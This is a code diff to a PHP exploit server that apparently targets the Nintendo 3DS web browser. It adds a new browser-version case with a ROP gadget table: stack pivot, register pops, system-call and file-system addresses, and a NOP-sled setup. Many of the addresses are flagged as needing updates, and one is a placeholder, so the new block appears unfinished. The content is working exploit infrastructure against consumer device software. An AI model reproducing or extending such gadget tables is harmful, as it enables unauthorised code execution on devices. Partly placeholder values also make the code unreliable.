@@ -62,7 +62,7 @@ if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
 }
 else if(strstr($ua, "1.1.9996"))// 1.1.9996 v1027 9.3.0-21
 {
-	$browserver = 0x80;
+	$browserver = 0x81;
 }
 
 if($browserver == -1)
@@ -72,7 +72,7 @@ if($browserver == -1)
 	return;
 }
 
-if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4 && $browserver != 0x80)
+if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4 && $browserver != 0x80 && $browserver != 0x81)
 {
 	echo "This browser version is not supported.\n";
 	writeNormalLog("RESULT: 200 BROWSERVER NOT SUPPORTED");
@@ -495,6 +495,72 @@ else if($browserver == 0x80)//new3ds
 	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
 }
+else if($browserver == 0x81)
+{
+	$CODEBLK_ENDADR = 0x00422000;//These likely need updated.
+	$OSSCRO_HEAPADR = 0x0810e000;
+	$WEBKITCRO_HEAPADR = 0x083cc000;
+	$PEERCRO_HEAPADR = 0x082e7000;
+	$APPHEAP_PHYSADDR = 0x2b000000;
+	init_mapaddrs_cro();
+
+	$STACKPIVOT_ADR = 0x00279c54;
+//Rest of these need updated.
+	$THROW_FATALERR = 0x001f10fc;
+	$COND_THROWFATALERR = 0x00261148;
+
+	$ROP_POP_R0R6PC = 0x001de9f0;
+	$ROP_POP_R0R8PC = 0x00309fdc;
+	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2d04;
+	$ROP_POP_R0PC = 0x002954e8;
+	$ROP_POP_R1R5PC = 0x001dbfd0;
+
+	$ROP_STR_R1TOR0 = 0x002258a4;
+	$ROP_LDR_R0FROMR0 = 0x001f6a60;
+	//$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated (doesn't exist with SKATER)
+	$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0xf8cfc;
+	$ROP_ADDR0_TO_R1 = 0x0027a2c0;
+
+	$ROP_LDMSTM_R5R4_R0R3 = 0x001e7d10;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r6, {r0, r1, r2, r3}" branch to: "vpop {d8}" "pop {r4, r5, r6, pc}"
+
+	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295b8c;//Same code as browserver val3.
+
+	$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x1ee9d;//Thumb: "stmia r0!, {r1, r2, r3, r4, r5, r6, r7}" nop "movs r0, #20". branch to: "pop {r4, r5, r6, pc}"
+
+	$SRVPORT_HANDLEADR = 0x003d9f80;
+	$SRV_REFCNT = 0x003d9da8;
+	$srvpm_initialize = 0x001ea3cc;
+	$srv_shutdown = 0x0028c9e4;//needs updated
+	$srv_GetServiceHandle = 0x001e9ce4;
+
+	$svcGetProcessId = 0x0026a608;
+	$svcSendSyncRequest = 0x001ea320;
+	$svcControlMemory = 0x00261eb8;
+	$svcSleepThread = 0x002d6a5c;
+
+	$GXLOW_CMD4 = 0x002a08d0;
+	$GSP_FLUSHDCACHE = 0x0029c02c;
+	$GSP_WRITEHWREGS = 0x002968bc;
+	$GSPGPU_SERVHANDLEADR = 0x003da3d0;
+
+	$IFile_Open = 0x0022fe08;//needs updated
+	$IFile_Close = 0x001fdba4;//needs updated
+	$IFile_GetSize = 0x00207514;//needs updated
+	$IFile_Seek = 0x00151694;//needs updated
+	$IFile_Read = 0x001686dc;//needs updated
+	$IFile_Write = 0x00168764;//needs updated
+
+	$FS_DELETEFILE = 0x0032368c;
+
+	$FSFILEIPC_CLOSE = 0x00266764;
+	$FSFILEIPC_READ = 0x0026670c;
+	$FSFILEIPC_GETSIZE = 0x003324c4;
+
+	//$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated (doesn't exist with SKATER)
+
+	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
+	//$APT_DoApplicationJump = 0x0029953c;//needs updated
+}
 
 if($browserver < 3)
 {
@@ -558,7 +624,8 @@ if($browserver < 0x80)
 }
 else
 {
-	$POPPC = 0x001de80c;
+	if($browserver == 0x80)$POPPC = 0x001de80c;
+	if($browserver == 0x81)$POPPC = 0x90909090;//0x001de80c;
 }
 
 $NOPSLEDROP = genu32_unicode_jswrap($POPPC);//"pop {pc}"
